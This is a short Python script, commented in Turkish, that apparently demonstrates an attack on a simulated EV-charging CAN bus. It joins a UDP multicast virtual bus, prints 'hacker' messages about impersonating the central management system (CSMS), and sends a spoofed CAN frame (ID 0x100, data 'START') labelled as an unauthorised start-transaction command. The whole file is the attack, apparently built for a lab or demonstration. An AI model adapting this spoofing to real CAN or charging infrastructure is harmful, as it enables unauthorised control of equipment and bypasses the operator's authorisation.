import can
import time

def saldir():
 
    bus = can.Bus(channel='239.0.0.1', interface='udp_multicast')
    
    print("😈 HACKER: Ağa sızılıyor...")
    print("😈 HACKER: Merkezi Sistem (CSMS) taklit ediliyor...")
    time.sleep(1)
    
    # Sahte START komutu (Yetki olmadan)
    # ID 0x100 -> StartTransaction
    msg = can.Message(arbitration_id=0x100, data=b'START', is_extended_id=False)
    
    try:
        bus.send(msg)
        print(f"🚀 SALDIRI: Sahte 'Yetki Verildi + Başlat' paketi yollandı! (ID: 0x100)")
    except can.CanError as e:
        print(f"Hata oluştu: {e}")

if __name__ == "__main__":
    saldir()
